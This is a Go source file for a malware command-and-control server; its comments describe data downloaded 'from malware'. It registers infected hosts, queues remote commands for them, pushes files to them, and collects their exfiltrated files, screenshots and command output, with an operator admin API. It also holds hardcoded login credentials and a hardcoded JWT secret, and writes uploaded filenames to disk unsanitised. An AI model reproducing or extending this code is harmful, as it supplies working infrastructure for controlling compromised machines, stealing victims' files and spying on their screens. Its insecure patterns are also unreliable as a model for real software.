package main

import (
	"bufio"
	"database/sql"
	"encoding/base64"
	"fmt"
	"github.com/dgrijalva/jwt-go"
	"github.com/labstack/echo"
	"github.com/labstack/echo/engine/standard"
	"github.com/labstack/echo/middleware"
	_ "github.com/mattn/go-sqlite3"
	"github.com/satori/go.uuid"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
)

func checkErr(err error) {
	if err != nil {
		fmt.Println(err)
	}
}

func checkAdminAuth(c echo.Context) bool {
	user := c.Get("user").(*jwt.Token)
	claims := user.Claims.(jwt.MapClaims)
	name := claims["name"].(string)
	admin := claims["admin"].(bool)
	if name == "Admin" && admin == true {
		return true
	}
	return false
}

func main() {

	db, err := sql.Open("sqlite3", "db/backend.sqlite")

	checkErr(err)

	defer db.Close()

	e := echo.New()

	e.Use(middleware.Logger())
	e.Use(middleware.Recover())
	e.Use(middleware.CORSWithConfig(middleware.CORSConfig{
		AllowOrigins: []string{"*"},
		AllowMethods: []string{echo.GET, echo.POST},
	}))
	// e.Use(middleware.StaticWithConfig(middleware.StaticConfig{
	// 	Root:   ".",
	// 	Browse: true,
	// }))

	e.GET("/api/v1/register/:name/:information/:groupid", func(c echo.Context) error {
		if c.Param("name") != "" && c.Param("information") != "" {
			req := c.Request().(*standard.Request).Request
			ip := strings.Split(req.RemoteAddr, ":")[0]
			escape_name, _ := url.QueryUnescape(c.Param("name"))
			name, err := base64.StdEncoding.DecodeString(string(escape_name))
			checkErr(err)

			escape_information, _ := url.QueryUnescape(c.Param("information"))
			information, err := base64.StdEncoding.DecodeString(string(escape_information))
			checkErr(err)

			groupid := "0"

			if c.Param("groupid") != "" {
				escape_groupid, _ := url.QueryUnescape(c.Param("groupid"))
				groupid, err = base64.StdEncoding.DecodeString(string(escape_groupid))
				checkErr(err)
			}

			var token string
			err = db.QueryRow("SELECT uuid FROM users WHERE name=? AND information=? AND ip=?",
				string(name), string(information), ip).Scan(&token)
			checkErr(err)
			if err == nil {
				return c.JSON(http.StatusOK, map[string]string{
					"token": token,
				})
			}

			uuid := uuid.NewV4()
			stmt, err := db.Prepare(`INSERT INTO users(uuid, ip, name, command, command_param, status, time, information, groupid)
			 			values (?, ?, ?, ?, ?, ?, ?, ?, ?)`)
			checkErr(err)
			stmt.Exec(uuid.String(), ip, string(name), "idle", "", "1", "CURRENT_TIMESTAMP", string(information), groupid)
			stmt.Close()

			stmt2, err := db.Prepare(`INSERT INTO upload(uuid, upload_base64_filename, upload_base64_data)
			 			values (?, ?, ?)`)
			checkErr(err)
			stmt2.Exec(uuid.String(), "", "")
			stmt2.Close()

			err = os.Mkdir("files/"+filepath.Clean(uuid.String()), 0777)
			err = os.Mkdir("files/"+filepath.Clean(uuid.String())+"/screenshots", 0777)
			err = os.Mkdir("files/"+filepath.Clean(uuid.String())+"/download_files", 0777)

			return c.JSON(http.StatusOK, map[string]string{
				"token": uuid.String(),
			})
		}
		return c.JSON(http.StatusBadRequest, map[string]string{
			"status": "error",
		})
	})

	e.GET("/api/v1/get_command/:uuid", func(c echo.Context) error {
		if c.Param("uuid") != "" {
			var command string
			var command_param string
			err := db.QueryRow("SELECT command, command_param FROM users WHERE uuid=?", c.Param("uuid")).Scan(&command, &command_param)
			_, _ = db.Exec(`UPDATE users SET command='idle', command_param="", status=1, time=CURRENT_TIMESTAMP WHERE uuid=?`,
				c.Param("uuid"))

			fmt.Printf("\n command = %s, param = %s \n", command, command_param)
			fmt.Println(err)
			commandParamBase64 := base64.StdEncoding.EncodeToString([]byte(command_param))
			if err == nil {
				return c.JSON(http.StatusOK, map[string]string{
					"command":       command,
					"command_param": commandParamBase64,
				})
			}
		}
		return c.JSON(http.StatusBadRequest, map[string]string{
			"status": "error",
		})

	})
	//
	//download data from malware
	//
	e.POST("/api/v1/download/:uuid", func(c echo.Context) error {
		if c.Param("uuid") != "" && c.FormValue("data") != "" && c.FormValue("filename") != "" {
			download_uuid := uuid.NewV4()
			download_base64_data := string(c.FormValue("data"))

			download_filename, _ := base64.StdEncoding.DecodeString(c.FormValue("filename"))
			//download_filename, _ := url.QueryUnescape(string(escape_download_filename))

			filename := "files/" + filepath.Clean(string(c.Param("uuid"))) + "/download_files/" + string(download_filename)
			end_filename := filepath.Clean(string(c.Param("uuid"))) + "/download_files/" + string(download_filename)

			fileHandle, _ := os.Create(filename)
			writer := bufio.NewWriter(fileHandle)
			defer fileHandle.Close()
			writeData, _ := base64.StdEncoding.DecodeString(c.FormValue("data"))
			writer.Write(writeData)
			writer.Flush()

			stmt, err := db.Prepare(`INSERT INTO download(download_uuid, uuid, download_base64_filename, download_base64_pathfile, download_base64_data)
			 			values (?, ?, ?, ?, ?)`)
			checkErr(err)

			defer stmt.Close()
			stmt.Exec(download_uuid.String(), c.Param("uuid"), download_filename, end_filename, download_base64_data)
			return c.JSON(http.StatusOK, map[string]string{
				"status": "ok",
			})
		}
		return c.JSON(http.StatusBadRequest, map[string]string{
			"status": "error",
		})
	})

	//
	// upload data to malware
	//
	e.GET("/api/v1/upload/:uuid", func(c echo.Context) error {
		if c.Param("uuid") != "" {
			var upload_base64_data string
			var upload_base64_filename string
			err := db.QueryRow("SELECT upload_base64_data, upload_base64_filename FROM upload WHERE uuid=?",
				c.Param("uuid")).Scan(&upload_base64_data, &upload_base64_filename)
			checkErr(err)
			if err == nil {
				return c.JSON(http.StatusOK, map[string]string{
					"data":     upload_base64_data,
					"filename": upload_base64_filename,
				})
			}
		}
		return c.JSON(http.StatusBadRequest, map[string]string{
			"status": "error",
		})
	})

	e.POST("/api/v1/output_command/:uuid", func(c echo.Context) error {
		if c.Param("uuid") != "" && c.FormValue("output") != "" && c.FormValue("command") != "" {
			output, _ := base64.StdEncoding.DecodeString(c.FormValue("output"))
			command, _ := base64.StdEncoding.DecodeString(c.FormValue("command"))

			command_uuid := uuid.NewV4()
			stmt, err := db.Prepare(`INSERT INTO output(command_uuid, uuid, command, output)
			 			values (?, ?, ?, ?)`)
			checkErr(err)

			defer stmt.Close()
			_, err = stmt.Exec(command_uuid.String(), c.Param("uuid"), string(command), string(output))
			fmt.Println(err)

			return c.JSON(http.StatusOK, map[string]string{
				"status": "ok",
			})
		}
		return c.JSON(http.StatusBadRequest, map[string]string{
			"status": "error",
		})
	})

	e.POST("/api/v1/screenshot/:uuid", func(c echo.Context) error {
		if c.Param("uuid") != "" && c.FormValue("data") != "" {
			screen_uuid := uuid.NewV4()
			pathScreenshot := filepath.Clean(string(c.Param("uuid"))) + "/screenshots/" + screen_uuid.String() + ".png"

			fileHandle, _ := os.Create("files/" + pathScreenshot)
			writer := bufio.NewWriter(fileHandle)
			defer fileHandle.Close()
			writeData, _ := base64.StdEncoding.DecodeString(c.FormValue("data"))
			writer.Write([]byte(writeData))
			writer.Flush()

			stmt, err := db.Prepare(`INSERT INTO screenshots(screen_uuid, uuid, screen)
			 			values (?, ?, ?)`)
			checkErr(err)

			defer stmt.Close()
			stmt.Exec(screen_uuid.String(), c.Param("uuid"), pathScreenshot)
			return c.JSON(http.StatusOK, map[string]string{
				"status": "ok",
			})
		}
		return c.JSON(http.StatusBadRequest, map[string]string{
			"status": "error",
		})
	})

	e.POST("/api/v1/admin/auth", func(c echo.Context) error {
		username := c.FormValue("username")
		password := c.FormValue("password")
		fmt.Println(username, password)
		if username == "jon" && password == "change_me" {
			token := jwt.New(jwt.SigningMethodHS256)
			claims := token.Claims.(jwt.MapClaims)
			claims["admin"] = true
			claims["name"] = "Admin"

			t, err := token.SignedString([]byte("123QWEasd"))
			if err != nil {
				return err
			}
			return c.JSON(http.StatusOK, map[string]string{
				"jwt_token": t,
			})
		}
		return echo.ErrUnauthorized
	})
	//
	// Admin API
	//
	admin := e.Group("/api/v1/admin")

	admin.Use(middleware.JWT([]byte("123QWEasd")))

	admin.GET("/get_active_users", func(c echo.Context) error {
		type Response struct {
			Uuid        string `json:"uuid"`
			IP          string `json:"ip"`
			Name        string `json:"name"`
			Command     string `json:"command"`
			Time        string `json:"time"`
			Information string `json:"information"`
			Groupid     string `json:"groupid"`
		}
		rows, err := db.Query(`SELECT uuid, ip, name, command, time, information, groupid FROM users WHERE status = 1`)
		checkErr(err)
		defer rows.Close()

		var respData []Response

		for rows.Next() {
			var resp Response
			err := rows.Scan(&resp.Uuid, &resp.IP, &resp.Name, &resp.Command, &resp.Time, &resp.Information, &resp.Groupid)
			checkErr(err)
			respData = append(respData, resp)
		}
		if err == nil {
			return c.JSON(http.StatusOK, respData)
		}
		return c.JSON(http.StatusBadRequest, map[string]string{
			"status": "error"})
	})

	admin.POST("/set_command/:uuid", func(c echo.Context) error {
		if checkAdminAuth(c) == false {
			return echo.ErrUnauthorized
		}
		if c.FormValue("command") != "" {
			var command_param = ""
			if c.FormValue("command_param") != "" {
				escape_command_param, _ := base64.StdEncoding.DecodeString(c.FormValue("command_param"))
				unescape_command_param, _ := url.QueryUnescape(string(escape_command_param))
				command_param = string(unescape_command_param)
			}
			fmt.Printf("command = %s\n", command_param)
			_, err = db.Exec(`UPDATE users SET command=?, command_param=? WHERE uuid=?`,
				c.FormValue("command"), string(command_param), c.Param("uuid"))
			if err == nil {
				return c.JSON(http.StatusOK, map[string]string{
					"status": "ok",
				})
			}
		}
		return c.JSON(http.StatusBadRequest, map[string]string{
			"status": "error",
		})
	})

	admin.POST("/set_file/:uuid", func(c echo.Context) error {
		if checkAdminAuth(c) == false {
			return echo.ErrUnauthorized
		}
		if c.FormValue("data") != "" && c.FormValue("filename") != "" {
			_, err := db.Exec(`UPDATE upload SET upload_base64_data=?, upload_base64_filename=? WHERE uuid=?`,
				c.FormValue("data"), c.FormValue("filename"), c.Param("uuid"))
			_, err2 := db.Exec(`UPDATE users SET command='upload', command_param="", status=1, time=CURRENT_TIMESTAMP WHERE uuid=?`,
				c.Param("uuid"))
			if err == nil && err2 == nil {
				return c.JSON(http.StatusOK, map[string]string{
					"status": "ok",
				})
			} else {
				fmt.Println(err)
			}
		}
		return c.JSON(http.StatusBadRequest, map[string]string{
			"status": "error",
		})
	})

	admin.POST("/deactivate_users/", func(c echo.Context) error {
		if checkAdminAuth(c) == false {
			return echo.ErrUnauthorized
		}
		_, err = db.Exec(`UPDATE users SET status=0`)
		if err == nil {
			return c.JSON(http.StatusOK, map[string]string{
				"status": "ok",
			})
		}
		return c.JSON(http.StatusBadRequest, map[string]string{
			"status": "error"})
	})

	admin.GET("/deactivate_user/:uuid", func(c echo.Context) error {
		if checkAdminAuth(c) == false {
			return echo.ErrUnauthorized
		}
		_, err = db.Exec(`UPDATE users SET status=0 WHERE uuid=?`, c.Param("uuid"))
		if err == nil {
			return c.JSON(http.StatusOK, map[string]string{
				"status": "ok",
			})
		}
		return c.JSON(http.StatusBadRequest, map[string]string{
			"status": "error"})
	})

	admin.GET("/get_files/:uuid", func(c echo.Context) error {
		if checkAdminAuth(c) == false {
			return echo.ErrUnauthorized
		}
		type Response struct {
			Uuid       string `json:"uuid"`
			Base64Data string `json:"data"`
			Filename   string `json:"filename"`
		}
		rows, err := db.Query(`SELECT download_uuid, download_base64_filename, download_base64_pathfile FROM download WHERE uuid = ?`,
			c.Param("uuid"))
		checkErr(err)
		defer rows.Close()

		var respData []Response

		for rows.Next() {
			var resp Response
			err := rows.Scan(&resp.Uuid, &resp.Filename, &resp.Base64Data)
			checkErr(err)
			respData = append(respData, resp)
		}
		if err == nil {
			return c.JSON(http.StatusOK, respData)
		}
		return c.JSON(http.StatusBadRequest, map[string]string{
			"status": "error"})
	})

	admin.GET("/get_screenshots/:uuid", func(c echo.Context) error {
		if checkAdminAuth(c) == false {
			return echo.ErrUnauthorized
		}
		type Response struct {
			Uuid       string `json:"uuid"`
			Base64Data string `json:"data"`
		}
		rows, err := db.Query(`SELECT screen_uuid, screen FROM screenshots WHERE uuid = ?`, c.Param("uuid"))
		checkErr(err)
		defer rows.Close()

		var respData []Response

		for rows.Next() {
			var resp Response
			err := rows.Scan(&resp.Uuid, &resp.Base64Data)
			checkErr(err)
			respData = append(respData, resp)
		}
		if err == nil {
			return c.JSON(http.StatusOK, respData)
		}
		return c.JSON(http.StatusBadRequest, map[string]string{
			"status": "error"})
	})

	admin.GET("/get_output_command/:uuid", func(c echo.Context) error {
		if checkAdminAuth(c) == false {
			return echo.ErrUnauthorized
		}
		type Response struct {
			Command_uuid string `json:"command_uuid"`
			Command      string `json:"command"`
			Output       string `json:"output"`
		}
		rows, err := db.Query(`SELECT command_uuid, command, output FROM output WHERE uuid = ?`, c.Param("uuid"))
		checkErr(err)
		defer rows.Close()

		var respData []Response

		for rows.Next() {
			var resp Response
			err := rows.Scan(&resp.Command_uuid, &resp.Command, &resp.Output)
			checkErr(err)
			respData = append(respData, resp)
		}
		if err == nil {
			return c.JSON(http.StatusOK, respData)
		}
		return c.JSON(http.StatusBadRequest, map[string]string{
			"status": "error"})
	})

	e.Run(standard.New("0.0.0.0:8090"))
}
